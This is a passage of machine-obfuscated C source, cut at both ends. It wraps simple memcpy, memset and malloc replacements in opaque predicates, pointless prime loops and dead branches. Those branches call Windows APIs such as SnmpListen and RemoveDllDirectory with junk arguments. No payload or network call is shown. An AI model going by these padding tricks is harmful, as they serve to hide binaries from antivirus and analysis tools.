        {
          unsigned long v246c112d264b45e40d8c0aa71b43dabe = (unsigned long) 0xcb6ae43f;
          void * v130da43aa76e24ae77fe15b4b6f6d438 = (void *) 0xa483a7aa;
          int v2fe86bc7381838f97bdbb2b8ab66dcb4 = (int) 0x47de111e;
          void * v98e01cba7b080ae824308ceaa5474622 = (void *) 0xfc4db083;
          int v88e34e0e99746c7d9e5f644f76169c8f = (int) 0xac88f17d;
          int v14c6baadf3bc01c3eff087177b4d4644 = (int) 0x516f0414;
          if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
          {
            if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
              {
                v14c6baadf3bc01c3eff087177b4d4644 = IdnToNameprepUnicode(v246c112d264b45e40d8c0aa71b43dabe, v130da43aa76e24ae77fe15b4b6f6d438, v2fe86bc7381838f97bdbb2b8ab66dcb4, v98e01cba7b080ae824308ceaa5474622, v88e34e0e99746c7d9e5f644f76169c8f);
              }
            }
          }
        }
        v8aa1f4314c591429346242aead35b54b_computation_opaque = (unsigned int) 1;
        if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
        {
          vb93e3da26b7a07f295c21cae9661296e_computation_opaque = (unsigned int) 3;
          while ((vb93e3da26b7a07f295c21cae9661296e_computation_opaque * vb93e3da26b7a07f295c21cae9661296e_computation_opaque) <= vab904d38200e21634b8e5e1df37c5999_computation_opaque)
          {
            if ((vab904d38200e21634b8e5e1df37c5999_computation_opaque % vb93e3da26b7a07f295c21cae9661296e_computation_opaque) == ((unsigned int) 0))
            {
              v8aa1f4314c591429346242aead35b54b_computation_opaque = (unsigned int) 0;
              if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
              {
                void * vf0e906e5e2ed497e49641cdf23d76173 = (void *) 0x85a57a17;
                int vbe06376388cfdafc4df9eed1aa585a6f = (int) 0xe1c21dea;
                if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
                {
                  vb93e3da26b7a07f295c21cae9661296e_computation_opaque = va7b20c265956b297cf8d396a2d429d30_computation_opaque + vab904d38200e21634b8e5e1df37c5999_computation_opaque;
                  vab904d38200e21634b8e5e1df37c5999_computation_opaque = vc381cff01edd1f184a7634d96d023102_useless_opaque / va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
                  va7b20c265956b297cf8d396a2d429d30_computation_opaque = ve97337ed6eddfd438a6750c37f33a099_computation_opaque / v8aa1f4314c591429346242aead35b54b_computation_opaque;
                  v784685fc2ad0966092bfefe67d3b2f6e_random_opaque = v784685fc2ad0966092bfefe67d3b2f6e_random_opaque || vab904d38200e21634b8e5e1df37c5999_computation_opaque;
                }
                vbe06376388cfdafc4df9eed1aa585a6f = RemoveDllDirectory(vf0e906e5e2ed497e49641cdf23d76173);
              }
              if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
              {
                va7b20c265956b297cf8d396a2d429d30_computation_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque | ((unsigned int) 8);
              }
            }
            vb93e3da26b7a07f295c21cae9661296e_computation_opaque = vb93e3da26b7a07f295c21cae9661296e_computation_opaque + ((unsigned int) 2);
          }

        }
      }

      unsigned int vaa191ca6c31b811cf517ef21b95877cb_prime_opaque = vab904d38200e21634b8e5e1df37c5999_computation_opaque;
    }
    while (va7b20c265956b297cf8d396a2d429d30_computation_opaque != ((unsigned int) 1))
    {
      va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque += (unsigned int) 2;
      va7b20c265956b297cf8d396a2d429d30_computation_opaque = (unsigned int) 1;
      ve97337ed6eddfd438a6750c37f33a099_computation_opaque = (unsigned int) 3;
      while ((ve97337ed6eddfd438a6750c37f33a099_computation_opaque * ve97337ed6eddfd438a6750c37f33a099_computation_opaque) <= va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque)
      {
        if ((va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque % ve97337ed6eddfd438a6750c37f33a099_computation_opaque) == ((unsigned int) 0))
        {
          va7b20c265956b297cf8d396a2d429d30_computation_opaque = (unsigned int) 0;
          if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
          {
            void * v80014c9ff2bd9bf493d648aeb5fefe3b = (void *) 0xf4f6210a;
            if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
            {
              unsigned long v7b2d21ba3c5a2f506e6e83ee0eb677b8 = (unsigned long) 0x66e512e4;
              unsigned long v659eedbaa9fbaf99d80676d0777f9901 = (unsigned long) 0xa21ecc61;
              if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
              {
                v659eedbaa9fbaf99d80676d0777f9901 = SnmpListen(v80014c9ff2bd9bf493d648aeb5fefe3b, v7b2d21ba3c5a2f506e6e83ee0eb677b8);
              }
            }
          }
        }
        ve97337ed6eddfd438a6750c37f33a099_computation_opaque = ve97337ed6eddfd438a6750c37f33a099_computation_opaque + ((unsigned int) 2);
        if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
        {
          void * v6461c45cadcae60ae887e610443493f8 = (void *) 0x87e090fd;
          void * v859cd9c663fa82395e4f534b18ffcfbb = (void *) 0x9be53b90;
          unsigned long v4ef4c2d21582d1303d60163e86e86af7 = (unsigned long) 0xe7475187;
          unsigned long vb99e38397a5c1b5755e2a5bae298dd1a = (unsigned long) 0xb7bb581f;
          vb99e38397a5c1b5755e2a5bae298dd1a = GetModuleFileNameA(v6461c45cadcae60ae887e610443493f8, v859cd9c663fa82395e4f534b18ffcfbb, v4ef4c2d21582d1303d60163e86e86af7);
        }
        if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
        {
          va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = va7b20c265956b297cf8d396a2d429d30_computation_opaque < v784685fc2ad0966092bfefe67d3b2f6e_random_opaque;
          v784685fc2ad0966092bfefe67d3b2f6e_random_opaque = va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque != vc381cff01edd1f184a7634d96d023102_useless_opaque;
          va1b165bc8df9652f85afbb02e5e74a09_useless_opaque = va7b20c265956b297cf8d396a2d429d30_computation_opaque / ve97337ed6eddfd438a6750c37f33a099_computation_opaque;
          if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
          {
            vc381cff01edd1f184a7634d96d023102_useless_opaque = va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque < va1b165bc8df9652f85afbb02e5e74a09_useless_opaque;
            vc381cff01edd1f184a7634d96d023102_useless_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque <= ((unsigned int) 47);
            va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = vc381cff01edd1f184a7634d96d023102_useless_opaque / va1b165bc8df9652f85afbb02e5e74a09_useless_opaque;
            vc381cff01edd1f184a7634d96d023102_useless_opaque = ve97337ed6eddfd438a6750c37f33a099_computation_opaque < va7b20c265956b297cf8d396a2d429d30_computation_opaque;
            va1b165bc8df9652f85afbb02e5e74a09_useless_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque != va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
            if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
            {
              va7b20c265956b297cf8d396a2d429d30_computation_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque <= va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
              va7b20c265956b297cf8d396a2d429d30_computation_opaque = v784685fc2ad0966092bfefe67d3b2f6e_random_opaque % vc381cff01edd1f184a7634d96d023102_useless_opaque;
            }
          }
          ve97337ed6eddfd438a6750c37f33a099_computation_opaque = ve97337ed6eddfd438a6750c37f33a099_computation_opaque / vc381cff01edd1f184a7634d96d023102_useless_opaque;
          if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
          {
            va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = va7b20c265956b297cf8d396a2d429d30_computation_opaque * va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
          }
        }
      }

    }

    unsigned int v56de0688fed54142ddadc92a930a53ed_prime_opaque = va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque;
    {
      if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
      {
        if (((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2)))
        {
          if ((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25)))
          {
            {
              unsigned char *d = (unsigned char *) dest;
              if (!(((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2))))
              {
                unsigned long vac591967961358d7caab4085b63e8bb3 = (unsigned long) 0x420a97dd;
                if (!(((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2))))
                {
                  if (((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2)))
                  {
                    if (!(((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2))))
                    {
                      vc381cff01edd1f184a7634d96d023102_useless_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque | ve97337ed6eddfd438a6750c37f33a099_computation_opaque;
                      if (!(((v56de0688fed54142ddadc92a930a53ed_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v56de0688fed54142ddadc92a930a53ed_prime_opaque == ((unsigned int) 2))))
                      {
                        vc381cff01edd1f184a7634d96d023102_useless_opaque = v56de0688fed54142ddadc92a930a53ed_prime_opaque != ((unsigned int) 59);
                      }
                    }
                    unsigned long v7d424206b6511a64528b7e4076f85cfb = (unsigned long) 0x1f8b016e;
                    unsigned long ve05a0c83089bbf7162a1453feac22cfa = (unsigned long) 0xd6a884ae;
                    ve05a0c83089bbf7162a1453feac22cfa = MsiGetActiveDatabase(v7d424206b6511a64528b7e4076f85cfb);
                  }
                }
                void * v252262b06b32bf67057b5e2e90da9bd0 = (void *) 0x5c31b719;
                int v073724e5694a6d80a084c4fb53063032 = (int) 0x69dcb609;
                void * vb446a7d96adbec97b58f8ff6380af234 = (void *) 0x281712b2;
                int v9fe8b646aeded93f060a43b5f01a2aa2 = (int) 0x337aa8a4;
                int veaabb32c95b68b6d830dd5a156b75e68 = (int) 0xe37c8329;
                veaabb32c95b68b6d830dd5a156b75e68 = IdnToNameprepUnicode(vac591967961358d7caab4085b63e8bb3, v252262b06b32bf67057b5e2e90da9bd0, v073724e5694a6d80a084c4fb53063032, vb446a7d96adbec97b58f8ff6380af234, v9fe8b646aeded93f060a43b5f01a2aa2);
              }
              const unsigned char *s = (const unsigned char *) src;
              while (n--)
              {
                *(d++) = *(s++);
                if (!((((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 9)) + ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 16))) == ((v784685fc2ad0966092bfefe67d3b2f6e_random_opaque * v784685fc2ad0966092bfefe67d3b2f6e_random_opaque) * ((unsigned int) 25))))
                {
                  vc381cff01edd1f184a7634d96d023102_useless_opaque = v784685fc2ad0966092bfefe67d3b2f6e_random_opaque != v56de0688fed54142ddadc92a930a53ed_prime_opaque;
                  va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = va1b165bc8df9652f85afbb02e5e74a09_useless_opaque | ve97337ed6eddfd438a6750c37f33a099_computation_opaque;
                  va7b20c265956b297cf8d396a2d429d30_computation_opaque = va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque | v56de0688fed54142ddadc92a930a53ed_prime_opaque;
                  ve97337ed6eddfd438a6750c37f33a099_computation_opaque = ve97337ed6eddfd438a6750c37f33a099_computation_opaque <= va7b20c265956b297cf8d396a2d429d30_computation_opaque;
                  va7ecdc5c0f95f27abdd33cc8d5579b7f_computation_opaque = v56de0688fed54142ddadc92a930a53ed_prime_opaque * va7b20c265956b297cf8d396a2d429d30_computation_opaque;
                  va1b165bc8df9652f85afbb02e5e74a09_useless_opaque = v56de0688fed54142ddadc92a930a53ed_prime_opaque || v784685fc2ad0966092bfefe67d3b2f6e_random_opaque;
                  va7b20c265956b297cf8d396a2d429d30_computation_opaque = vc381cff01edd1f184a7634d96d023102_useless_opaque * va1b165bc8df9652f85afbb02e5e74a09_useless_opaque;
                }
              }

              return dest;
            }
          }
        }
      }
    }
  }
}

void *replacement_memset(void *s, int c, size_t n)
{
  {
    {
      {
        unsigned char *p = (unsigned char *) s;
        while (n--)
        {
          *(p++) = (unsigned char) c;
        }

        return s;
      }
      unsigned int v02d5545f73957de38f718c661d05c13d_useless_opaque = (unsigned int) 2360517571;
      unsigned int vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque = (unsigned int) (&v02d5545f73957de38f718c661d05c13d_useless_opaque);
      unsigned int vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque = (((vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque * vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque) + vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      unsigned int v1ba1424e0660e88164c70689326bb477_useless_opaque = (unsigned int) 2672088242;
      unsigned int v23389295b3677bb6286b6d546a44ec1e_computation_opaque = (unsigned int) 0;
      unsigned int v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque = (unsigned int) 3;
      unsigned int vb7694149dcdebdf7f0489b5d20d34351_computation_opaque = (unsigned int) (&v1ba1424e0660e88164c70689326bb477_useless_opaque);
      vb7694149dcdebdf7f0489b5d20d34351_computation_opaque = (vb7694149dcdebdf7f0489b5d20d34351_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vb7694149dcdebdf7f0489b5d20d34351_computation_opaque < ((unsigned int) 3))
      {
        vb7694149dcdebdf7f0489b5d20d34351_computation_opaque = (unsigned int) 3;
      }
      while (v23389295b3677bb6286b6d546a44ec1e_computation_opaque != ((unsigned int) 1))
      {
        vb7694149dcdebdf7f0489b5d20d34351_computation_opaque += (unsigned int) 2;
        if (vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
        {
          v23389295b3677bb6286b6d546a44ec1e_computation_opaque = (unsigned int) 1;
          if (!vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
          {
            unsigned long vfeb548b366753a73ca062320863ed1de = (unsigned long) 0xb745e173;
            unsigned long ve2a859dc1f1082b776efb6b53d3821eb = (unsigned long) 0xf8ff552a;
            void * ve608430d9db01e2842d5a33d4366cf88 = (void *) 0xd66421b8;
            int v4b86e200836c16a0225bb6bcefecba06 = (int) 0x5285cc99;
            if (!vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
            {
              v02d5545f73957de38f718c661d05c13d_useless_opaque = v02d5545f73957de38f718c661d05c13d_useless_opaque == v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque;
              v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque = vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque % ((unsigned int) 107);
              v23389295b3677bb6286b6d546a44ec1e_computation_opaque = v1ba1424e0660e88164c70689326bb477_useless_opaque / vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque;
              v1ba1424e0660e88164c70689326bb477_useless_opaque = vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque == ((unsigned int) 64);
              v02d5545f73957de38f718c661d05c13d_useless_opaque = v23389295b3677bb6286b6d546a44ec1e_computation_opaque == v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque;
              v1ba1424e0660e88164c70689326bb477_useless_opaque = vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque | v1ba1424e0660e88164c70689326bb477_useless_opaque;
              vaccf6f661447d54cdcbc995cfc0f891c_computation_opaque = v1ba1424e0660e88164c70689326bb477_useless_opaque < vb7694149dcdebdf7f0489b5d20d34351_computation_opaque;
            }
            int v889309af40165f883425a3096590f3ca = (int) 0x9e461d4c;
            v889309af40165f883425a3096590f3ca = GetLocaleInfoW(vfeb548b366753a73ca062320863ed1de, ve2a859dc1f1082b776efb6b53d3821eb, ve608430d9db01e2842d5a33d4366cf88, v4b86e200836c16a0225bb6bcefecba06);
          }
          v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque = (unsigned int) 3;
          while ((v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque * v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque) <= vb7694149dcdebdf7f0489b5d20d34351_computation_opaque)
          {
            if (vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
            {
              if ((vb7694149dcdebdf7f0489b5d20d34351_computation_opaque % v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque) == ((unsigned int) 0))
              {
                if (!vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
                {
                  unsigned long v62b184624d435565890a462264c01c94 = (unsigned long) 0x2aacac3d;
                  unsigned long v7597137f629cd05e64e7716434dd0e45 = (unsigned long) 0x31c3c92e;
                  v7597137f629cd05e64e7716434dd0e45 = MsiGetActiveDatabase(v62b184624d435565890a462264c01c94);
                  if (!vc13d0cf24f52eca1fa2f067f16a350d8_true_opaque)
                  {
                    void * v50086940428b328584abd3692a6cff33 = (void *) 0xe89be5a8;
                    long v1a50542110b8480fb6a1f6bcc4e49542 = (long) 0xc5fcc887;
                    v1a50542110b8480fb6a1f6bcc4e49542 = RoUnregisterForApartmentShutdown(v50086940428b328584abd3692a6cff33);
                  }
                }
                v23389295b3677bb6286b6d546a44ec1e_computation_opaque = (unsigned int) 0;
              }
              v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque = v75aa764f007f945be0b74f8fb6d6b5bc_computation_opaque + ((unsigned int) 2);
            }
          }

        }
      }

      unsigned int ve90ee0ed6ca0785dccb6447e3fc19ead_prime_opaque = vb7694149dcdebdf7f0489b5d20d34351_computation_opaque;
    }
    unsigned int v22c481e19e02c5836bd07c3dcdc06550_useless_opaque = (unsigned int) 4183817803;
    unsigned int v337a896ab2e9db3c6ae9e30516f2657c_random_opaque = (unsigned int) (&v22c481e19e02c5836bd07c3dcdc06550_useless_opaque);
  }
}

void *replacement_malloc(size_t size)
{
  {
    {
      unsigned int v98f53355f1039dc5a8ce3ac7ed284147_useless_opaque = (unsigned int) 3622118858;
      unsigned int vc2797ad351d2212ba3ba44b406119101_computation_opaque = (unsigned int) 0;
      unsigned int vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque = (unsigned int) 3;
      unsigned int v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque = (unsigned int) (&v98f53355f1039dc5a8ce3ac7ed284147_useless_opaque);
      v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque = (v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque < ((unsigned int) 3))
      {
        v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque = (unsigned int) 3;
      }
      while (vc2797ad351d2212ba3ba44b406119101_computation_opaque != ((unsigned int) 1))
      {
        v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque += (unsigned int) 2;
        vc2797ad351d2212ba3ba44b406119101_computation_opaque = (unsigned int) 1;
        vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque = (unsigned int) 3;
        while ((vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque * vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque) <= v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque)
        {
          if ((v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque % vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque) == ((unsigned int) 0))
          {
            vc2797ad351d2212ba3ba44b406119101_computation_opaque = (unsigned int) 0;
          }
          vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque = vdc7e62aeaf4e6f2f4d968c9d0eadc03b_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v9a27643475573a4951a3349a9aec2b19_prime_opaque = v8a7598a99ec77610fbffbe2aecf212dc_computation_opaque;
      {
        if (!(((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2))))
        {
          unsigned long v476903109d93d92a80c9ab950b0b569d = (unsigned long) 0x821070da;
          if (!(((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2))))
          {
            void * v09342cb984dbfcae99c29ea94c1f185d = (void *) 0x8fe2a3ec;
            if (!(((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2))))
            {
              unsigned long v4ebfb2f7bbca1af43cfb0b36d2cdcd48 = (unsigned long) 0xc0f1692a;
              unsigned long v715098df3f0fbe54a997b9cec2da9683 = (unsigned long) 0x0821f5d1;
              void * v527ca42c8d82270f17908d64a67cd998 = (void *) 0x9670a1d9;
              int v8cc0ce46a8b1d63a999575279a835d2f = (int) 0x3cecb3ee;
              int v9c861aace0d4a0694185a15b3f71942b = (int) 0x68dea036;
              v9c861aace0d4a0694185a15b3f71942b = GetLocaleInfoW(v4ebfb2f7bbca1af43cfb0b36d2cdcd48, v715098df3f0fbe54a997b9cec2da9683, v527ca42c8d82270f17908d64a67cd998, v8cc0ce46a8b1d63a999575279a835d2f);
            }
            void * va06c13caa6bcdaf52a77e04e7d35e44c = (void *) 0x1af47ec5;
            unsigned long v5ccb9fbfb55b6ded00592c35a5e6ac58 = (unsigned long) 0xfaead4ff;
            unsigned long v59e447ec2746d14dcfceac477f50df99 = (unsigned long) 0xfff60e1d;
            if (!(((v9a27643475573a4951a3349a9aec2b19_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v9a27643475573a4951a3349a9aec2b19_prime_opaque == ((unsigned int) 2))))
            {
              vc2797ad351d2212ba3ba44b406119101_computation_opaque = v9a27643475573a4951a3349a9aec2b19_prime_opaque | v98f53355f1039dc5a8ce3ac7ed284147_useless_opaque;
